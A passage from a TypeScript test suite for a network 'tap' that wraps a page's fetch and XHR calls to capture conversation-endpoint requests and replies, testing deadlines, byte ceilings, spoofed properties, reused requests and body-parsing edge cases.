    // …and once the deadline opened it, the exchange is closed exactly once,
    // in order.
    expect(
      h.seen.filter((m) => m.type !== 'ready' && m.type !== 'patched').map((m) => m.type),
    ).toEqual(['request', 'error', 'end']);
    expect(h.of('request')[0]).toMatchObject({ method: 'POST', body: null });
    expect(h.of('error')[0]).toMatchObject({ reason: 'aborted' });
    expect(h.of('end')).toHaveLength(1);
  });

  it('proceeds when a deferred request body never settles', async () => {
    // A Request whose body is a stream the page never closes: `duplex: 'half'`
    // lets the server answer first, so without a deadline the tap would hold a
    // response clone — whose tee buffers the whole response — on a promise that
    // never resolves, for the life of the page.
    const never = new ReadableStream<Uint8Array>({
      start() {
        // Deliberately never enqueues and never closes.
      },
    });
    const request = new Request('https://site.test/api/conversation', {
      method: 'POST',
      body: never,
      duplex: 'half',
    } as RequestInit & { duplex: string });
    const { fn } = fakeFetch('assistant reply');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    vi.useFakeTimers();
    try {
      await fetchOn(win)(request);
      // Far past any deadline the tap could be holding, so the case pins the
      // property rather than a particular number.
      await vi.advanceTimersByTimeAsync(60_000);
    } finally {
      vi.useRealTimers();
    }
    await h.waitFor(() => h.of('end').length > 0);

    // The exchange opened with no body rather than not opening at all…
    expect(h.of('request')[0]).toMatchObject({ method: 'POST', body: null });
    // …and the response was drained and the exchange closed.
    expect(h.of('chunk').map((m) => m.text)).toEqual(['assistant reply']);
    expect(h.of('end')).toHaveLength(1);
  });

  it('stops pulling a response at its byte ceiling and says the exchange was cut', async () => {
    // The tap reads a clone, and a tee's branches are independent: nothing tells
    // it the page abandoned its own branch, so an unbounded pump keeps a
    // download the page gave up on alive for as long as the server sends. The
    // ceiling is what bounds that. The source here would go on to twice the
    // ceiling, so an uncapped tap terminates too — and fails on the counts
    // below rather than hanging.
    const MIB = 1024 * 1024;
    const CEILING_MIB = 4;
    let pulls = 0;
    const stream = new ReadableStream<Uint8Array>({
      pull(controller) {
        pulls += 1;
        if (pulls > CEILING_MIB * 2) {
          controller.close();
          return;
        }
        controller.enqueue(new Uint8Array(MIB).fill(0x61));
      },
    });
    const win = {
      fetch: () => Promise.resolve(new Response(stream)),
    } as unknown as Window;
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    await fetchOn(win)('https://site.test/api/conversation');
    await h.waitFor(() => h.of('end').length > 0);

    expect(h.of('error')[0]).toMatchObject({ reason: 'truncated' });
    // Exactly the ceiling, not the whole source: the cut is where it says it is.
    expect(h.of('chunk')).toHaveLength(CEILING_MIB);
    // Still ended, so the chunks before the cut are usable and the bridge is
    // not left holding an open id.
    expect(h.of('end')).toHaveLength(1);
    // And it really stopped pulling, which is the point — the chunk count alone
    // would be satisfied by a tap that read the whole source and forwarded less
    // of it. Bounded by the source's own length rather than by the ceiling: the
    // tee reads ahead by a chunk or two into the branch nobody is draining.
    expect(pulls).toBeLessThan(CEILING_MIB * 2);
  });
});

describe('installTap: the XHR half', () => {
  it('forwards a matched send as request, chunk and end, in that order', async () => {
    const { win, create } = xhrWindow();
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const xhr = create();
    xhr.open('POST', 'https://site.test/api/conversation');
    xhr.send('{"prompt":"hi"}');
    xhr.respond(200, 'assistant reply');
    await h.settle();

    // The page's own call reached the originals with the arguments it wrote.
    expect(xhr.opened).toEqual({ method: 'POST', url: 'https://site.test/api/conversation' });
    expect(xhr.sent).toEqual(['{"prompt":"hi"}']);

    expect(
      h.seen.filter((m) => m.type !== 'ready' && m.type !== 'patched').map((m) => m.type),
    ).toEqual(['request', 'chunk', 'end']);
    expect(h.of('request')[0]).toMatchObject({
      method: 'POST',
      url: 'https://site.test/api/conversation',
      body: '{"prompt":"hi"}',
    });
    expect(h.of('chunk')[0]).toMatchObject({ text: 'assistant reply' });
    expect(h.of('end')[0]).toMatchObject({ status: 200, ok: true });
  });

  it('forwards nothing for a send no endpoint matches', async () => {
    const { win, create } = xhrWindow();
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const xhr = create();
    xhr.open('POST', 'https://site.test/api/telemetry');
    xhr.send('{"beacon":1}');
    xhr.respond(200, 'telemetry accepted');
    await h.settle();

    expect(h.seen.filter((m) => m.type !== 'ready' && m.type !== 'patched')).toEqual([]);
    // The original still ran, so the page's request is unaffected.
    expect(xhr.sent).toEqual(['{"beacon":1}']);
  });

  it('reads a response off the prototype, not off a property defined over it', async () => {
    // Same class as the Request case above, reached through the other
    // transport: shadowing an accessor on the instance changes what the tap
    // reports and nothing about what the server actually sent, so a page could
    // have arbitrary content recorded as a matched endpoint's reply.
    const { win, create } = xhrWindow();
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const xhr = create();
    xhr.open('POST', 'https://site.test/api/conversation');
    xhr.send('{"prompt":"hi"}');
    Object.defineProperty(xhr, 'responseText', { value: 'FABRICATED', configurable: true });
    Object.defineProperty(xhr, 'status', { value: 999, configurable: true });
    Object.defineProperty(xhr, 'responseType', { value: 'blob', configurable: true });
    xhr.respond(200, 'the real body');
    await h.settle();

    expect(h.of('chunk').map((m) => m.text)).toEqual(['the real body']);
    expect(h.of('end')[0]).toMatchObject({ status: 200, ok: true });
  });

  it("never reports a reused request's later response under the first send's id", async () => {
    // An XHR object is reusable. A `loadend` listener added per send used to
    // stay attached for the life of the object, so the SECOND response fired it
    // again and posted that body under the FIRST send's id — bytes from a URL
    // no pattern matched, forwarded and then persisted.
    const { win, create } = xhrWindow();
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const xhr = create();
    xhr.open('POST', 'https://site.test/api/conversation');
    xhr.send('{"prompt":"hi"}');
    xhr.respond(200, 'matched body');

    xhr.open('POST', 'https://site.test/api/telemetry');
    xhr.send('{"beacon":1}');
    xhr.respond(200, 'UNMATCHED BODY');
    await h.settle();

    expect(h.of('chunk').map((m) => m.text)).toEqual(['matched body']);
    expect(h.of('request')).toHaveLength(1);
    expect(h.of('end')).toHaveLength(1);
    // The mechanism, not just the outcome: a listener that reported is retired,
    // so a long-lived request object accumulates none.
    expect(xhr.loadendListeners()).toBe(0);
  });

  it('stays silent when a request is re-opened before its own response arrived', async () => {
    // The other half of the same defence, and the one `once` cannot cover.
    // Re-opening ABORTS the send in flight, and the abort fires that send's own
    // `loadend` from inside open() — so the listener does run, with a status of
    // 0 and no body. Without the state-identity check it reports that as the
    // matched exchange's `end`.
    const { win, create } = xhrWindow();
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const xhr = create();
    xhr.open('POST', 'https://site.test/api/conversation');
    xhr.send('{"prompt":"hi"}');
    xhr.open('POST', 'https://site.test/api/telemetry');
    xhr.send('{"beacon":1}');
    xhr.respond(200, 'UNMATCHED BODY');
    await h.settle();

    expect(h.of('request')).toHaveLength(1);
    expect(h.of('chunk')).toHaveLength(0);
    expect(h.of('end')).toHaveLength(0);
  });

  it('forwards no body for a responseType it cannot read as text', async () => {
    const { win, create } = xhrWindow();
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const xhr = create();
    xhr.responseType = 'arraybuffer';
    xhr.open('POST', 'https://site.test/api/conversation');
    xhr.send('{"prompt":"hi"}');
    xhr.respond(200, 'bytes that are not text');
    await h.settle();

    expect(h.of('chunk')).toHaveLength(0);
    // The exchange still ends, so the bridge is not left holding an open id.
    expect(h.of('end')[0]).toMatchObject({ status: 200, ok: true });
  });

  it('reports tap_error rather than throwing into the page when responseText throws', async () => {
    const { win, create } = xhrWindow();
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const xhr = create();
    xhr.open('POST', 'https://site.test/api/conversation');
    xhr.send('{"prompt":"hi"}');
    xhr.failResponseText();
    // The page dispatches its own loadend; a throw escaping here would land in
    // the site's event loop, which is the one thing the tap may never do.
    expect(() => {
      xhr.respond(200);
    }).not.toThrow();
    await h.settle();

    expect(h.of('error')[0]).toMatchObject({ reason: 'tap_error' });
    expect(h.of('chunk')).toHaveLength(0);
    // A fault still closes the exchange it opened.
    expect(h.of('end')).toHaveLength(1);
  });

  it('reports a send body it cannot read and follows nothing further', async () => {
    const { win, create } = xhrWindow();
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const xhr = create();
    xhr.open('POST', 'https://site.test/api/conversation');
    xhr.send(new ArrayBuffer(8));
    xhr.respond(200, 'assistant reply');
    await h.settle();

    expect(h.of('error')[0]).toMatchObject({ reason: 'unparsed_body' });
    expect(h.of('request')).toHaveLength(0);
    expect(h.of('chunk')).toHaveLength(0);
    // Nothing was opened, so nothing is closed.
    expect(h.of('end')).toHaveLength(0);
  });

  it('forwards nothing for a send that was never opened', async () => {
    const { win, create } = xhrWindow();
    const h = harness();
    installTap(win, h.port, [EVERYTHING]);

    const xhr = create();
    xhr.send('{"prompt":"hi"}');
    xhr.respond(200, 'assistant reply');
    await h.settle();

    expect(h.seen.filter((m) => m.type !== 'ready' && m.type !== 'patched')).toEqual([]);
    expect(xhr.sent).toEqual(['{"prompt":"hi"}']);
  });

  it('opens the exchange for a gzip body, rather than losing it whole', async () => {
    // planBody is shared with the fetch half, so a gzip body plans as
    // DEFERRED here too. This branch used to test for 'sync' alone, and its
    // else — written when 'unreadable' was the only other kind — swallowed
    // the deferred plan: the wire carried `unparsed_body` and nothing else,
    // so the response was lost as well as the request, while the same body
    // over fetch still captured the reply.
    const { win, create } = xhrWindow();
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const xhr = create();
    xhr.open('POST', 'https://site.test/api/conversation');
    xhr.send(await gzipOf('{"prompt":"hi"}'));
    xhr.respond(200, 'assistant reply');
    await h.waitFor(() => h.of('end').length > 0);

    // `request` precedes the response posts, as it does over fetch: the
    // consumer must never see an exchange closed before it was opened.
    expect(
      h.seen.filter((m) => m.type !== 'ready' && m.type !== 'patched').map((m) => m.type),
    ).toEqual(['request', 'chunk', 'end']);
    expect(h.of('request')[0]).toMatchObject({ body: '{"prompt":"hi"}' });
    expect(h.of('chunk')[0]).toMatchObject({ text: 'assistant reply' });
    expect(h.of('end')[0]).toMatchObject({ status: 200, ok: true });
    // The page's own send still carried its own bytes.
    expect(xhr.sent).toHaveLength(1);
  });

  it('still opens no exchange for a body it genuinely cannot read', async () => {
    // The control for the case above: 'unreadable' must keep reporting
    // `unparsed_body` and opening nothing, or the fix above would have been
    // "open an exchange for everything".
    const { win, create } = xhrWindow();
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const xhr = create();
    xhr.open('POST', 'https://site.test/api/conversation');
    // A stream body has one reader, so taking it would empty the page's own
    // request — planBody refuses it.
    xhr.send(new ReadableStream());
    xhr.respond(200, 'assistant reply');
    await h.settle();

    expect(
      h.seen.filter((m) => m.type !== 'ready' && m.type !== 'patched').map((m) => m.type),
    ).toEqual(['error']);
    expect(h.of('error')[0]).toMatchObject({ reason: 'unparsed_body' });
  });
});
